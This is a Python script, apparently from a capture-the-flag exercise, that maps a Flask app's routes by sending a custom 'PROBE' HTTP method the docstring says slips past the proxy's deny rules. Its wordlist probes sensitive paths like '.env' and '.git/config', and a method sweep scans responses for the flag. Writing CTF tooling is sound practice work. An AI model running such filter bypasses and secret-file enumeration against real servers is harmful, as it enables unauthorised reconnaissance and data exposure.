#!/usr/bin/env python3
"""
Enumerate the Flask route table behind proxoxy and make it diffable local vs remote.

Probe method is PROBE: rule 1 is `method eq GET`, rule 2 needs a `brevski` header, so neither
deny rule touches it. Flask answers 405 + `Allow:` for a known path and 404 for an unknown one.

Usage: python3 routes.py <host> <port>
Output is a stable sorted table so `diff` between two runs is meaningful.
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 28888

KNOWN = ["/health", "/flag", "/random_ahh_game"]

WORDS = [
    "", "flag", "health", "random_ahh_game", "flagski", "cheese", "burrito", "beans",
    "crab", "mccrab", "mccrab3", "brevski", "george", "game", "play", "stop", "cheat",
    "reset", "cash", "win", "admin", "debug", "console", "env", "environ", "config",
    "config.json", "proxoxy", "server.py", "app.py", "static", "api", "api/flag",
    "v1/flag", "flag.txt", "flags", "secret", "secrets", "internal", "private",
    "metrics", "status", "healthz", "readyz", "livez", "ping", "echo", "test",
    "index", "home", "login", "user", "users", "session", "token", "auth",
    "rules", "rule", "proxy", "backend", "upstream", "shell", "exec", "cmd",
    "robots.txt", ".env", ".git/config", "swagger", "openapi.json", "docs",
    "random", "ahh", "ahh_game", "randomgame", "random-ahh-game", "game/flag",
    "flag/", "//flag", "FLAG", "Flag", "getflag", "give_flag", "givemeflag",
    "timeski", "brevski/flag", "george/flag", "mcsky", "sky", "crabby",
    "well_done", "winner", "prize", "reward", "loot", "bag", "money",
]


import time

def probe(method, path, extra=b"", tries=3):
    """Retry and pace: a fresh remote instance refuses connections under a tight loop,
    and an unretried CONNERR silently turns an untested path into a 'not found'."""
    for attempt in range(tries):
        r = _probe1(method, path, extra)
        if r[0] != "CONNERR":
            return r
        time.sleep(0.4 * (attempt + 1))
    return r


def _probe1(method, path, extra=b""):
    raw = ("%s %s HTTP/1.1\r\n" % (method, path)).encode() + b"Host: h\r\n" + extra + \
          b"Content-Length: 0\r\nConnection: close\r\n\r\n"
    out = b""
    try:
        s = socket.create_connection((HOST, PORT), 6)
        s.settimeout(3.0)
        s.sendall(raw)
        while True:
            try:
                d = s.recv(65536)
            except (socket.timeout, TimeoutError):
                break
            if not d:
                break
            out += d
        s.close()
    except OSError:
        return ("CONNERR", 0, "", b"")
    if not out:
        return ("EATEN", 0, "", b"")
    head, _, body = out.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].split(b" ", 1)[-1].decode("latin-1")[:24]
    allow = ""
    for ln in head.split(b"\r\n"):
        if ln.lower().startswith(b"allow:"):
            allow = ln.split(b":", 1)[1].strip().decode("latin-1")
    if allow:
        allow = ", ".join(sorted(x.strip() for x in allow.split(",")))
    time.sleep(0.06)
    return (status, len(body), allow, body)


print("target %s:%d" % (HOST, PORT))
print("=== A. path enumeration with method PROBE (405+Allow = route exists) ===")
found = []
for w in WORDS:
    p = "/" + w if not w.startswith("/") else w
    st, n, allow, _ = probe("PROBE", p)
    if st.startswith("404"):
        continue
    found.append((p, st, n, allow))
    print("%-24s %-24s len=%-5d allow=%s" % (p, st, n, allow))

names = {p for p, _, _, _ in found}
missing = [k for k in KNOWN if k not in names]
print("\nCONTROL: sweep re-found known routes? missing=%s" % (missing or "NONE - control passes"))

print("\n=== B. every known route x every known method, for a local/remote diff ===")
METHODS = ["GET", "HEAD", "POST", "OPTIONS", "PUT", "DELETE", "TRACE", "PATCH",
           "PLAY", "RESET", "STOP", "CHEAT", "FLAG", "PROBE"]
for path in KNOWN + ["/nope"]:
    for m in METHODS:
        st, n, allow, body = probe(m, path)
        tag = ""
        if b"TFCCTF{" in body:
            tag = " *** FLAG *** " + body[body.find(b"TFCCTF{"):body.find(b"}") + 1].decode("latin-1")
        print("%-18s %-8s %-24s len=%-5d allow=%-42s%s" % (path, m, st, n, allow, tag))
